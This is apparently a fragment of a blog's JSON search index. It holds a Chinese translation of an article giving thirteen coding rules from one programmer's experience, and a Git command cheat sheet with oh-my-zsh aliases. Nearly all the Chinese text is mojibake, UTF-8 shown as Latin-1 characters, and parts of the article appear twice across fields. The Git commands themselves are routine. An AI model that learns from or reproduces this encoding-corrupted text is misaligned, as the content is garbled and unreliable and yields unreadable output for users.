åœ¨éå¸¸ç¡¬çš„é€»è¾‘ä¸­çŠ¯äº†å·¨å¤§çš„é”™è¯¯ï¼Œç„¶åä½ ç»™è¿™ä¸ªä»£ç å®¡æŸ¥æ–°çš„å®¶ä¼™ã€‚ä½ æ€ä¹ˆè®¤ä¸ºä¼šå‘ç”Ÿæ„å¤–çš„é£é™©ï¼Ÿ - æˆ‘çš„ç»ƒä¹ ç‡è¶…è¿‡70ï¼…ã€‚\nè‰¯å¥½çš„å›¢é˜Ÿæ˜¯æ¯ä¸ªäººéƒ½æœ‰è‡ªå·±çš„è§’è‰²ï¼Œè´Ÿè´£ç¡®åˆ‡çš„å·¥ä½œã€‚å¦‚æœæœ‰äººæƒ³è¦ç†è§£å¦ä¸€æ®µä»£ç ï¼Œé‚£ä¹ˆä»–å»ä¸€ä¸ªè´Ÿè´£ä»»å»é—®ä»–ã€‚ä½ ä¸å¯èƒ½çŸ¥é“ä¸€åˆ‡ï¼Œæ›´å¥½çš„ä¼˜ç§€çš„ç†è§£å°å—ä»£ç è€Œä¸æ˜¯ç†è§£æ‰€æœ‰ã€‚\n8. é‡æ„æ²¡å•¥ç”¨ åœ¨æˆ‘çš„èŒä¸šç”Ÿæ¶¯ä¸­ï¼Œæˆ‘å¬åˆ°å¾ˆå¤šæ¬¡â€œä¸è¦æ‹…å¿ƒï¼Œæˆ‘ä»¬ä»¥åä¼šé‡æ„å®ƒâ€ã€‚åœ¨æœªæ¥ï¼Œè¿™ä¼šå¯¼è‡´å¤§çš„æŠ€æœ¯å€ºåŠ¡æˆ–ä»å¤´å¼€å§‹åˆ é™¤æ‰€æœ‰çš„ä»£ç å’Œå†™ä½œã€‚\næ‰€ä»¥ï¼Œä¸è¦å¾—åˆ°ä¸€ä¸ªå€ºåŠ¡ï¼Œé™¤éä½ æœ‰é’±ä»å¤´å¼€å‘ä½ çš„è½¯ä»¶å‡ æ¬¡ã€‚\n9. å½“ä½ ç´¯äº†æˆ–åœ¨ä¸€ä¸ªåçš„å¿ƒæƒ…ä¸è¦å†™ä»£ç ã€‚ å½“å¼€å‘äººå‘˜åŒå€¦æ—¶ï¼Œä»–ä»¬æ­£åœ¨åˆ¶é€ 2åˆ°5å€æˆ–è€…æ›´å¤šçš„bugã€‚æ‰€ä»¥å·¥ä½œæ›´å¤šæ˜¯éå¸¸ç³Ÿç³•çš„åšæ³•ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¶Šæ¥è¶Šå¤šçš„å›½å®¶æ€è€ƒ6å°æ—¶å·¥ä½œæ—¥ï¼Œå…¶ä¸­ä¸€äº›å·²ç»æœ‰äº†ã€‚ç²¾ç¥å·¥ä½œä¸åŒäºä½¿ç”¨ä½ çš„äºŒå¤´è‚Œã€‚\n10. ä¸è¦ä¸€æ¬¡å†™å…¨éƒ¨ - ä½¿å¼€å‘è¿­ä»£ åœ¨ç¼–å†™ä»£ç åˆ†æå’Œé¢„æµ‹ä¹‹å‰ï¼Œæ‚¨çš„å®¢æˆ·/å®¢æˆ·çœŸæ­£éœ€è¦ä»€ä¹ˆï¼Œç„¶åé€‰æ‹©æ‚¨å¯ä»¥åœ¨çŸ­æœŸå†…ä»¥é«˜è´¨é‡å¼€å‘çš„MVFï¼ˆæœ€æœ‰ä»·å€¼çš„åŠŸèƒ½ï¼‰ã€‚ä½¿ç”¨è¿™æ ·çš„è¿­ä»£æ¥éƒ¨ç½²è´¨é‡æ›´æ–°ï¼Œè€Œä¸æ˜¯è…°éƒ¨æ—¶é—´å’Œèµ„æºå¯¹ä¸åˆç†çš„æ„¿æœ›å’Œç‰ºç‰²ä¸è´¨é‡ã€‚\n11. è‡ªåŠ¨åŒ–VSæ‰‹åŠ¨ è‡ªåŠ¨åŒ–æ˜¯é•¿æœŸçš„100ï¼…æˆåŠŸã€‚æ‰€ä»¥å¦‚æœä½ æœ‰èµ„æºè‡ªåŠ¨åŒ–çš„ä¸œè¥¿ï¼Œç°åœ¨åº”è¯¥åšã€‚ä½ å¯èƒ½è®¤ä¸ºâ€œåªéœ€è¦5åˆ†é’Ÿï¼Œä¸ºä»€ä¹ˆæˆ‘åº”è¯¥è‡ªåŠ¨åŒ–ï¼Ÿä½†è®©æˆ‘è®¡ç®—è¿™ä¸ªã€‚ä¾‹å¦‚ï¼Œå®ƒæ˜¯5ä¸ªå¼€å‘äººå‘˜çš„æ—¥å¸¸ä»»åŠ¡ã€‚ 5åˆ†é’Ÿ_ 5å¤©_ 21å¤©* 12ä¸ªæœˆ= 6 300åˆ†é’Ÿ= 105å°æ—¶= 13.125å¤©ã€œ5250 $ã€‚å¦‚æœä½ æœ‰40 000åå‘˜å·¥ï¼Œè¿™å°†éœ€è¦å¤šå°‘è´¹ç”¨ï¼Ÿ\n12. å‡ºå»æµªï¼Œå­¦ä¹ æ–°çˆ±å¥½ å·®å¼‚åŒ–å·¥ä½œå¯ä»¥å¢åŠ å¿ƒæ™ºèƒ½åŠ›ï¼Œå¹¶æä¾›æ–°æƒ³æ³•ã€‚æ‰€ä»¥ï¼Œæš‚åœç°åœ¨çš„å·¥ä½œï¼Œå‡ºå»å‘¼å¸ä¸€ä¸‹æ–°é²œç©ºæ°”ï¼Œä¸æœ‹å‹äº¤è°ˆï¼Œå¼¹å‰ä»–ç­‰ã€‚ps: è«æ˜¥è€…ï¼Œæ˜¥æœæ—¢æˆï¼Œå† è€…äº”å…­äººï¼Œç«¥å­å…­ä¸ƒäººï¼Œæµ´ä¹æ²‚ï¼Œé£ä¹èˆé›©ï¼Œå’è€Œå½’ã€‚------ã€Šè®ºè¯­.å…ˆè¿›ã€‹ã€‚\n13. åœ¨ç©ºé—²æ—¶é—´å­¦ä¹ æ–°äº‹ç‰© å½“äººä»¬åœæ­¢å­¦ä¹ æ—¶ï¼Œä»–ä»¬å¼€å§‹é€€åŒ–ã€‚\n","permalink":"https://wdd.js.org/posts/2019/10/corgz1/","summary":"åŸæ–‡åœ°å€ï¼šhttps://hackernoon.com/few-simple-rules-for-good-coding-my-15-years-experience-96cb29d4acd9#.ddzpjb80c\nå—¨ï¼Œæˆ‘çš„å·¥ä½œä½œä¸ºä¸€ä¸ªç¨‹åºå‘˜è¶…è¿‡15å¹´ï¼Œå¹¶ä½¿ç”¨è®¸å¤šä¸åŒçš„è¯­è¨€ï¼ŒèŒƒä¾‹ï¼Œæ¡†æ¶å’Œå…¶ä»–ç‹—å±ã€‚æˆ‘æƒ³å’Œå¤§å®¶åˆ†äº«æˆ‘å†™å¥½ä»£ç çš„è§„åˆ™ã€‚\n1. ä¼˜åŒ–VSå¯è¯»æ€§ å»ä»–å¦ˆçš„ä¼˜åŒ– å§‹ç»ˆç¼–å†™æ˜“äºé˜…è¯»ä¸”å¯¹å¼€å‘äººå‘˜å¯ç†è§£çš„ä»£ç ã€‚å› ä¸ºåœ¨ç¡¬å¯è¯»ä»£ç ä¸ŠèŠ±è´¹çš„æ—¶é—´å’Œèµ„æºå°†è¿œè¿œé«˜äºä»ä¼˜åŒ–ä¸­è·å¾—çš„ã€‚å¦‚æœä½ éœ€è¦è¿›è¡Œä¼˜åŒ–ï¼Œé‚£ä¹ˆä½¿å®ƒåƒDIçš„ç‹¬ç«‹æ¨¡å—ï¼Œå…·æœ‰100ï¼…çš„æµ‹è¯•è¦†ç›–ç‡ï¼Œå¹¶ä¸”ä¸ä¼šè¢«è§¦åŠè‡³å°‘ä¸€å¹´ã€‚\n2. æ¶æ„ç¬¬ä¸€ æˆ‘çœ‹åˆ°å¾ˆå¤šäººè¯´â€œæˆ‘ä»¬éœ€è¦å¿«é€Ÿåšäº‹ï¼Œæˆ‘ä»¬æ²¡æœ‰æ—¶é—´åšæ¶æ„â€ã€‚å…¶ä¸­çº¦99ï¼…çš„äººå› ä¸ºè¿™æ ·çš„æƒ³æ³•è€Œé‡åˆ°äº†å¤§é—®é¢˜ã€‚ç¼–å†™ä»£ç è€Œä¸è€ƒè™‘å…¶æ¶æ„æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œå°±åƒæ²¡æœ‰å®ç°å®ƒä»¬çš„è®¡åˆ’ä¸€æ ·ï¼Œæ¢¦æƒ³ä½ çš„æ„¿æœ›ã€‚åœ¨ç¼–å†™ä»£ç çš„ç¬¬ä¸€è¡Œä¹‹å‰ï¼Œä½ åº”è¯¥æ˜ç™½å®ƒå°†è¦åšä»€ä¹ˆï¼Œå®ƒå°†å¦‚ä½•ä½¿ç”¨ï¼Œæ¨¡å—ï¼ŒæœåŠ¡å¦‚ä½•ç›¸äº’å·¥ä½œï¼Œå®ƒå°†æœ‰ä»€ä¹ˆç»“æ„ï¼Œå¦‚ä½•è¿›è¡Œæµ‹è¯•å’Œè°ƒè¯•ï¼Œä»¥åŠå¦‚ä½•æ›´æ–°ã€‚\n3. æµ‹è¯•è¦†ç›–ç‡ æµ‹è¯•æ˜¯å¥½äº‹ï¼Œä½†ä»–ä»¬å¹¶ä¸æ€»æ˜¯è´Ÿæ‹…å¾—èµ·ï¼Œå¯¹é¡¹ç›®æœ‰æ„ä¹‰ã€‚\nå½“ä½ éœ€è¦æµ‹è¯•ï¼š\nå½“ä½ ç¼–å†™æ¨¡å—æ—¶ï¼Œå¾®æœåŠ¡å°†ä¸ä¼šè¢«è§¦åŠè‡³å°‘ä¸€ä¸ªæœˆã€‚ å½“ä½ ç¼–å†™å¼€æºä»£ç ã€‚ å½“ä½ ç¼–å†™æ¶‰åŠé‡‘èæ¸ é“çš„æ ¸å¿ƒä»£ç æˆ–ä»£ç ã€‚ å½“æ‚¨æœ‰ä»£ç æ›´æ–°çš„åŒæ—¶æ›´æ–°æµ‹è¯•çš„èµ„æºã€‚ å½“ä½ ä¸éœ€è¦æµ‹è¯•æ—¶ï¼š\nå½“ä½ æ˜¯ä¸€ä¸ªåˆ›ä¸šã€‚ å½“ä½ æœ‰å°å›¢é˜Ÿå’Œä»£ç æ›´æ”¹æ˜¯å¿«é€Ÿã€‚ å½“ä½ ç¼–å†™çš„è„šæœ¬ï¼Œå¯ä»¥ç®€å•åœ°é€šè¿‡ä»–ä»¬çš„è¾“å‡ºæ‰‹åŠ¨æµ‹è¯•ã€‚ è®°ä½ï¼Œå¸¦æœ‰ä¸¥æ ¼æµ‹è¯•çš„ä»£ç å¯èƒ½æ¯”æ²¡æœ‰æµ‹è¯•çš„ä»£ç æ›´æœ‰å®³ã€‚\n4. ä¿æŒç®€å•ï¼Œæåº¦ç®€å• ä¸è¦ç¼–å†™å¤æ‚çš„ä»£ç ã€‚æ›´å¤šæ›´ç®€å•ï¼Œé‚£ä¹ˆæ›´å°‘çš„é”™è¯¯å®ƒå¯èƒ½æœ‰å’Œæ›´å°‘çš„æ—¶é—´æ¥è°ƒè¯•å®ƒä»¬ã€‚ä»£ç åº”è¯¥åšçš„åªæ˜¯å®ƒéœ€è¦æ²¡æœ‰éå¸¸å¤šçš„æŠ½è±¡å’Œå…¶ä»–OOP shitï¼ˆå°¤å…¶æ˜¯æ¶‰åŠjavaå¼€å‘äººå‘˜ï¼‰+ 20ï¼…çš„ä¸œè¥¿å¯èƒ½éœ€è¦åœ¨å°†æ¥ä»¥ç®€å•çš„æ–¹å¼æ›´æ–°å®ƒã€‚\n5. æ³¨é‡Š å‡ºç°æ³¨é‡Šè¯´æ˜ä½ çš„ä»£ç ä¸å¤Ÿå¥½ã€‚å¥½çš„ä»£ç åº”è¯¥æ˜¯å¯ä»¥ç†è§£çš„ï¼Œæ²¡æœ‰ä¸€è¡Œæ³¨é‡Šã€‚ä½†æ˜¯å¦‚ä½•ä¸ºæ–°å¼€å‘äººå‘˜èŠ‚çœæ—¶é—´ï¼Ÿ - ç¼–å†™ç®€å•çš„å†…è”æ–‡æ¡£æè¿°ä»€ä¹ˆå’Œå¦‚ä½•æ–¹æ³•å·¥ä½œã€‚è¿™å°†èŠ‚çœå¾ˆå¤šæ—¶é—´æ¥ç†è§£ï¼Œç”šè‡³æ›´å¤š - å®ƒå°†ç»™äººä»¬æ›´å¤šçš„æœºä¼šæ¥æå‡ºæ›´å¥½çš„å®æ–½è¿™ç§æ–¹æ³•ã€‚å¹¶ä¸”å®ƒå°†æ˜¯å…¨çƒä»£ç æ–‡æ¡£çš„è‰¯å¥½å¼€ç«¯ã€‚\n6. ç¡¬è€¦åˆVSè¾ƒå°è€¦åˆ å§‹ç»ˆå°è¯•ä½¿ç”¨å¾®æœåŠ¡æ¶æ„ã€‚å•ç‰‡è½¯ä»¶å¯ä»¥æ¯”å¾®æœåŠ¡è½¯ä»¶è¿è¡Œå¾—æ›´å¿«ï¼Œä½†åªèƒ½åœ¨ä¸€ä¸ªæœåŠ¡å™¨çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œã€‚å¾®æœåŠ¡ä½¿æ‚¨å¯ä»¥ä¸ä»…åœ¨è®¸å¤šæœåŠ¡å™¨ä¸Šï¼Œè€Œä¸”æœ‰æ—¶ç”šè‡³åœ¨ä¸€å°æœºå™¨ä¸Šï¼ˆæˆ‘çš„æ„æ€æ˜¯è¿‡ç¨‹åˆ†å‘ï¼‰é«˜æ•ˆåœ°åˆ†å‘æ‚¨çš„è½¯ä»¶ã€‚\n7. ä»£ç å®¡æŸ¥ ä»£ç å®¡æŸ¥å¯ä»¥æ˜¯å¥½çš„ï¼Œä¹Ÿä»¥æ˜¯åçš„ã€‚æ‚¨å¯ä»¥ç»„ç»‡ä»£ç å®¡æŸ¥ï¼Œåªæœ‰å½“æ‚¨æœ‰å¼€å‘äººå‘˜äº†è§£95ï¼…çš„ä»£ç ï¼Œè°å¯ä»¥ç›‘æ§æ‰€æœ‰æ›´æ–°ï¼Œè€Œä¸æµªè´¹å¾ˆå¤šæ—¶é—´ã€‚åœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œè¿™å°†æ˜¯åªæ˜¯è€—æ—¶ï¼Œæ¯ä¸ªäººéƒ½ä¼šè®¨åŒè¿™ä¸ªã€‚\nåœ¨è¿™éƒ¨åˆ†æœ‰å¾ˆå¤šé—®é¢˜ï¼Œæ‰€ä»¥æ›´æ·±å…¥åœ°æè¿°è¿™ä¸€ç‚¹ã€‚\nè®¸å¤šäººè®¤ä¸ºä»£ç å®¡æŸ¥æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æ–¹å¼æ•™æ–°æ‰‹ï¼Œæˆ–è€…å·¥ä½œåœ¨ä¸åŒéƒ¨åˆ†çš„ä»£ç çš„é˜Ÿå‹ã€‚ä½†æ˜¯ä»£ç å®¡æŸ¥çš„ä¸»è¦ç›®æ ‡æ˜¯ä¿æŒä»£ç è´¨é‡ï¼Œè€Œä¸æ˜¯æ•™å­¦ã€‚è®©æˆ‘ä»¬æƒ³è±¡ä½ çš„å›¢é˜Ÿåˆ¶ä½œä»£ç ç”¨äºæ§åˆ¶æ ¸ååº”å †æˆ–å¤ªç©ºç«ç®­å‘åŠ¨æœºçš„å†·å´ç³»ç»Ÿã€‚ä½ åœ¨éå¸¸ç¡¬çš„é€»è¾‘ä¸­çŠ¯äº†å·¨å¤§çš„é”™è¯¯ï¼Œç„¶åä½ ç»™è¿™ä¸ªä»£ç å®¡æŸ¥æ–°çš„å®¶ä¼™ã€‚ä½ æ€ä¹ˆè®¤ä¸ºä¼šå‘ç”Ÿæ„å¤–çš„é£é™©ï¼Ÿ - æˆ‘çš„ç»ƒä¹ ç‡è¶…è¿‡70ï¼…ã€‚\nè‰¯å¥½çš„å›¢é˜Ÿæ˜¯æ¯ä¸ªäººéƒ½æœ‰è‡ªå·±çš„è§’è‰²ï¼Œè´Ÿè´£ç¡®åˆ‡çš„å·¥ä½œã€‚å¦‚æœæœ‰äººæƒ³è¦ç†è§£å¦ä¸€æ®µä»£ç ï¼Œé‚£ä¹ˆä»–å»ä¸€ä¸ªè´Ÿè´£ä»»å»é—®ä»–ã€‚ä½ ä¸å¯èƒ½çŸ¥é“ä¸€åˆ‡ï¼Œæ›´å¥½çš„ä¼˜ç§€çš„ç†è§£å°å—ä»£ç è€Œä¸æ˜¯ç†è§£æ‰€æœ‰ã€‚\n8. é‡æ„æ²¡å•¥ç”¨ åœ¨æˆ‘çš„èŒä¸šç”Ÿæ¶¯ä¸­ï¼Œæˆ‘å¬åˆ°å¾ˆå¤šæ¬¡â€œä¸è¦æ‹…å¿ƒï¼Œæˆ‘ä»¬ä»¥åä¼šé‡æ„å®ƒâ€ã€‚åœ¨æœªæ¥ï¼Œè¿™ä¼šå¯¼è‡´å¤§çš„æŠ€æœ¯å€ºåŠ¡æˆ–ä»å¤´å¼€å§‹åˆ é™¤æ‰€æœ‰çš„ä»£ç å’Œå†™ä½œã€‚\næ‰€ä»¥ï¼Œä¸è¦å¾—åˆ°ä¸€ä¸ªå€ºåŠ¡ï¼Œé™¤éä½ æœ‰é’±ä»å¤´å¼€å‘ä½ çš„è½¯ä»¶å‡ æ¬¡ã€‚\n9. å½“ä½ ç´¯äº†æˆ–åœ¨ä¸€ä¸ªåçš„å¿ƒæƒ…ä¸è¦å†™ä»£ç ã€‚ å½“å¼€å‘äººå‘˜åŒå€¦æ—¶ï¼Œä»–ä»¬æ­£åœ¨åˆ¶é€ 2åˆ°5å€æˆ–è€…æ›´å¤šçš„bugã€‚æ‰€ä»¥å·¥ä½œæ›´å¤šæ˜¯éå¸¸ç³Ÿç³•çš„åšæ³•ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¶Šæ¥è¶Šå¤šçš„å›½å®¶æ€è€ƒ6å°æ—¶å·¥ä½œæ—¥ï¼Œå…¶ä¸­ä¸€äº›å·²ç»æœ‰äº†ã€‚ç²¾ç¥å·¥ä½œä¸åŒäºä½¿ç”¨ä½ çš„äºŒå¤´è‚Œã€‚\n10. ä¸è¦ä¸€æ¬¡å†™å…¨éƒ¨ - ä½¿å¼€å‘è¿­ä»£ åœ¨ç¼–å†™ä»£ç åˆ†æå’Œé¢„æµ‹ä¹‹å‰ï¼Œæ‚¨çš„å®¢æˆ·/å®¢æˆ·çœŸæ­£éœ€è¦ä»€ä¹ˆï¼Œç„¶åé€‰æ‹©æ‚¨å¯ä»¥åœ¨çŸ­æœŸå†…ä»¥é«˜è´¨é‡å¼€å‘çš„MVFï¼ˆæœ€æœ‰ä»·å€¼çš„åŠŸèƒ½ï¼‰ã€‚ä½¿ç”¨è¿™æ ·çš„è¿­ä»£æ¥éƒ¨ç½²è´¨é‡æ›´æ–°ï¼Œè€Œä¸æ˜¯è…°éƒ¨æ—¶é—´å’Œèµ„æºå¯¹ä¸åˆç†çš„æ„¿æœ›å’Œç‰ºç‰²ä¸è´¨é‡ã€‚\n11. è‡ªåŠ¨åŒ–VSæ‰‹åŠ¨ è‡ªåŠ¨åŒ–æ˜¯é•¿æœŸçš„100ï¼…æˆåŠŸã€‚æ‰€ä»¥å¦‚æœä½ æœ‰èµ„æºè‡ªåŠ¨åŒ–çš„ä¸œè¥¿ï¼Œç°åœ¨åº”è¯¥åšã€‚ä½ å¯èƒ½è®¤ä¸ºâ€œåªéœ€è¦5åˆ†é’Ÿï¼Œä¸ºä»€ä¹ˆæˆ‘åº”è¯¥è‡ªåŠ¨åŒ–ï¼Ÿä½†è®©æˆ‘è®¡ç®—è¿™ä¸ªã€‚ä¾‹å¦‚ï¼Œå®ƒæ˜¯5ä¸ªå¼€å‘äººå‘˜çš„æ—¥å¸¸ä»»åŠ¡ã€‚ 5åˆ†é’Ÿ_ 5å¤©_ 21å¤©* 12ä¸ªæœˆ= 6 300åˆ†é’Ÿ= 105å°æ—¶= 13.125å¤©ã€œ5250 $ã€‚å¦‚æœä½ æœ‰40 000åå‘˜å·¥ï¼Œè¿™å°†éœ€è¦å¤šå°‘è´¹ç”¨ï¼Ÿ","title":"ã€è¯‘ã€‘13ç®€å•çš„ä¼˜ç§€ç¼–ç è§„åˆ™ï¼ˆä»æˆ‘15å¹´çš„ç»éªŒï¼‰"},{"content":"å¦‚æœå‘½ä»¤è¡Œå¯ä»¥è§£å†³çš„é—®é¢˜ï¼Œå°±ç»å¯¹ä¸è¦ç”¨GUIå·¥å…·ã€‚å¿«ç‚¹è¯•ç”¨Git bashå§ï¼Œ åˆ«å†ç”¨TortoiseGitäº†ã€‚\n1. å¿…ä¼š8ä¸ªå‘½ä»¤ ä¸‹é¢çš„æ“ä½œéƒ½æ˜¯ç»å¸¸ä½¿ç”¨çš„ï¼Œæœ‰äº›åªéœ€è¦åšä¸€æ¬¡ï¼Œæœ‰äº›æ˜¯ç»å¸¸æ“ä½œçš„\ngitå‘½ä»¤è™½ç„¶å¤šï¼Œä½†æ˜¯ç»å¸¸ä½¿ç”¨çš„ä¸è¶…è¿‡8ä¸ªã€‚\nå‘½ä»¤ æ‰§è¡Œæ¬¡æ•° è¯´æ˜ git clone http://sdfjslf.git æ¯ä¸ªé¡¹ç›®åªéœ€è¦æ‰§è¡Œä¸€æ¬¡ //å…‹éš†ä¸€ä¸ªé¡¹ç›® git fetch origin round-2 æ¯ä¸ªåˆ†æ”¯åªéœ€è¦æ‰§è¡Œä¸€æ¬¡ //round-2åˆ†æ”¯åœ¨æœ¬åœ°ä¸å­˜åœ¨ï¼Œé¦–å…ˆè¦åˆ›å»ºä¸€ä¸ªåˆ†æ”¯ git checkout round-2 å¤šæ¬¡ // åˆ‡æ¢åˆ°round-2åˆ†æ”¯ git branch --set-upstream-to=origin/round-2 æ¯ä¸ªåˆ†æ”¯åªéœ€è¦æ‰§è¡Œä¸€æ¬¡ // å°†æœ¬åœ°round-2åˆ†æ”¯å…³è”è¿œç¨‹round-2åˆ†æ”¯ git add -A æ¯æ¬¡å¢åŠ æ–‡ä»¶éƒ½è¦æ‰§è¡Œ // åœ¨round-2ä¸‹åˆ›å»ºäº†ä¸€ä¸ªæ–‡ä»¶, ä½¿ç”¨-Aå¯ä»¥æ·»åŠ æ‰€æœ‰æ–‡ä»¶åˆ°æš‚å­˜åŒº git commit -am \u0026quot;æˆ‘å¢åŠ äº†ä¸€ä¸ªæ–‡ä»¶\u0026quot; æ¯æ¬¡æäº¤éƒ½è¦æ‰§è¡Œ // commit git push æ¯æ¬¡æ¨é€éƒ½è¦æ‰§è¡Œ //æœ€å¥½æ˜¯åœ¨pushä¹‹å‰ï¼Œä½¿ç”¨git pullæ‹‰å»è¿œç¨‹ä»£ç åˆ°æœ¬åœ°ï¼Œå¦åˆ™æœ‰å¯èƒ½è¢«æ‹’ç» git pull æ¯æ¬¡æ‹‰å»éƒ½è¦æ‰§è¡Œ æ‹‰å»è¿œç¨‹åˆ†æ”¯ä»£ç åˆ°æœ¬åœ°å¹¶åˆå¹¶åˆ°å½“å‰åˆ†æ”¯ 2. å¸¸ç”¨çš„gitå‘½ä»¤ å‡è®¾ä½ åœ¨masteråˆ†æ”¯ä¸Š\n// å°†æœ¬åœ°ä¿®æ”¹åçš„æ–‡ä»¶æ¨é€åˆ°æœ¬åœ°ä»“åº“ git commit -am \u0026#39;ä¿®æ”¹äº†ä¸€ä¸ªé—®é¢˜\u0026#39; // å°†æœ¬åœ°ä»“åº“æ¨é€åˆ°è¿œç¨‹ä»“åº“ git push 2.1. çŠ¶æ€ç®¡ç† 2.1.1. çŠ¶æ€æŸ¥çœ‹ æŸ¥çœ‹å½“å‰ä»“åº“çŠ¶æ€\ngit status 2.2. åˆ†æ”¯ç®¡ç† 2.2.1. åˆ†æ”¯æ–°å»º åŸºäºå½“å‰åˆ†æ”¯ï¼Œåˆ›å»ºteståˆ†æ”¯\n// åˆ›å»ºdevåˆ†æ”¯ git checkout dev // åˆ›å»ºdevåˆ†æ”¯åï¼Œåˆ‡æ¢åˆ°devåˆ†æ”¯ git checkout -b dev // ä»¥æŸä¸ªcommitIdä¸ºèµ·ç‚¹åˆ›å»ºåˆ†æ”¯ git checkout -b new-branch-name commit-id 2.2.2. åˆ†æ”¯æŸ¥çœ‹ æŸ¥çœ‹è¿œç¨‹åˆ†æ”¯ï¼š git branch -r\n// æŸ¥çœ‹æœ¬åœ°åˆ†æ”¯ git branch // æŸ¥çœ‹è¿œç¨‹åˆ†æ”¯ git branch -r // æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯ git branch -a 2.2.3. åˆ†æ”¯åˆ‡æ¢ åˆ‡æ¢åˆ°æŸä¸ªåˆ†æ”¯: git checkout 0.10.7\n\u0026gt; git checkout 0.10.7 Branch 0.10.7 set up to track remote branch 0.10.7 from origin. Switched to a new branch \u0026#39;0.10.7\u0026#39; 2.2.4. åˆ†æ”¯åˆå¹¶ å°†masteråˆ†æ”¯åˆå¹¶åˆ°0.10.7åˆ†æ”¯: git merge\n\u0026gt; git merge master Merge made by the \u0026#39;recursive\u0026#39; strategy. public/javascripts/app-qc.js | 83 +++++++++++++++++++++++++-- views/menu.html | 1 + views/qc-template-show-modal.html | 114 ++++++++++++++++++++++++++++++++++++++ views/qc-template.html | 7 ++- 4 files changed, 198 insertions(+), 7 deletions(-) create mode 100644 views/qc-template-show-modal.html // æœ‰æ—¶å€™åªæƒ³åˆå¹¶æŸæ¬¡commitåˆ°å½“å‰åˆ†æ”¯ï¼Œè€Œä¸æ˜¯åˆå¹¶æ•´ä¸ªåˆ†æ”¯ï¼Œå¯ä»¥ä½¿ç”¨ cherry-pick åˆå¹¶ git cherry-pick commmitId 2.2.5. åˆ†æ”¯åˆ é™¤ // åˆ é™¤è¿œç¨‹devåˆ†æ”¯ git push --delete origin dev // åˆ é™¤æœ¬åœ°devåˆ†æ”¯ git branch -D dev 2.2.6. æ‹‰å–æœ¬åœ°ä¸å­˜åœ¨çš„è¿œç¨‹åˆ†æ”¯ // å‡è®¾ç°åœ¨åœ¨masteråˆ†æ”¯ï¼Œ æˆ‘éœ€è¦æ‹‰å»è¿œç¨‹çš„devåˆ†æ”¯åˆ°æœ¬åœ°ï¼Œè€Œæœ¬åœ°æ²¡æœ‰devåˆ†æ”¯ // æ‹‰å–è¿œç¨‹åˆ†æ”¯åˆ°æœ¬åœ° git fetch orgin è¿œç¨‹åˆ†æ”¯å:æœ¬åœ°åˆ†æ”¯å git fetch origin dev:dev // åˆ‡æ¢åˆ°devåˆ†æ”¯ git checkout dev // æœ¬åœ°devåˆ†æ”¯å…³è”è¿œç¨‹devåˆ†æ”¯, å¦‚æœä¸æŠŠæœ¬åœ°devåˆ†æ”¯å…³è”è¿œç¨‹devåˆ†æ”¯ï¼Œåˆ™æ‰§è¡Œgit pullå’Œgit pushå‘½ä»¤æ—¶ä¼šæŠ¥é”™ git branch --set-upstream-to=origin/dev // ç„¶åä½ å°±å¯ä»¥åœ¨devåˆ†æ”¯ä¸Šç¼–è¾‘äº† 2.3. ç‰ˆæœ¬å¯¹æ¯” // æŸ¥çœ‹å°šæœªæš‚å­˜çš„æ–‡ä»¶æ›´æ–°äº†å“ªäº›éƒ¨åˆ† git diff // æŸ¥çœ‹æŸä¸¤ä¸ªç‰ˆæœ¬ä¹‹é—´çš„å·®å¼‚ git diff commitID1 commitID2 // æŸ¥çœ‹æŸä¸¤ä¸ªç‰ˆæœ¬çš„æŸä¸ªæ–‡ä»¶ä¹‹é—´çš„å·®å¼‚ git diff commitID1:filename1 commitID2:filename2 2.4. æ—¥å¿—æŸ¥çœ‹ git log git short-log 2.5. æ’¤é”€ä¿®æ”¹ 2.5.1. æ’¤é”€å¤„äºä¿®æ”¹çŠ¶æ€çš„æ–‡ä»¶ å¦‚æœä½ ä¿®æ”¹äº†æŸä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰commitåˆ°æœ¬åœ°ä»“åº“ã€‚\ngit checkout -- somefile.js 2.5 ä¸¢å¼ƒæ‰€æœ‰æœªæäº¤çš„æ”¹å˜ git clean ç”¨æ¥åˆ é™¤æœªè·Ÿè¸ªçš„æ–°åˆ›å»ºçš„æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹\ngit checkout . \u0026amp;\u0026amp; git clean -xdf\ngit clean\n-x ä¸è¯»å–gitignoreä¸­çš„å¿½ç•¥è§„åˆ™ -d åˆ é™¤æ‰€æœ‰æœªè·Ÿè¸ªçš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ -f å¼ºåˆ¶ 3. oh-my-zshä¸­å¸¸ç”¨çš„gitç¼©å†™ alias ga=\u0026#39;git add\u0026#39; alias gb=\u0026#39;git branch\u0026#39; alias gba=\u0026#39;git branch -a\u0026#39; alias gbd=\u0026#39;git branch -d\u0026#39; alias gcam=\u0026#39;git commit -a -m\u0026#39; alias gcb=\u0026#39;git checkout -b\u0026#39; alias gco=\u0026#39;git checkout\u0026#39; alias gcm=\u0026#39;git checkout master\u0026#39; alias gcp=\u0026#39;git cherry-pick\u0026#39; alias gd=\u0026#39;git diff\u0026#39; alias gfo=\u0026#39;git fetch origin\u0026#39; alias ggpush=\u0026#39;git push origin $(git_current_branch)\u0026#39; alias ggsup=\u0026#39;git branch --set-upstream-to=origin/$(git_current_branch)\u0026#39; alias glgp=\u0026#39;git log --stat -p\u0026#39; alias gm=\u0026#39;git merge\u0026#39; alias gp=\u0026#39;git push\u0026#39; alias gst=\u0026#39;git status\u0026#39; alias gsta=\u0026#39;git stash save\u0026#39; alias gstp=\u0026#39;git stash pop\u0026#39; alias gl=\u0026#39;git pull\u0026#39; alias glg=\u0026#39;git log --stat\u0026#39; alias glgp=\u0026#39;git log --stat -p\u0026#39; alias glgga=\u0026#39;git log --graph --decorate --all\u0026#39; // å›¾å½¢åŒ–æŸ¥çœ‹åˆ†æ”¯ä¹‹é—´çš„å‘å±•å…³ç³» oh-my-zsh gitå‘½ä»¤ç¼©å†™å®Œæ•´ç‰ˆ\n4. å‚è€ƒæ–‡çŒ® git å‘½ä»¤å‚è€ƒ ã€ŠPro Git ä¸­æ–‡ç‰ˆã€‹ 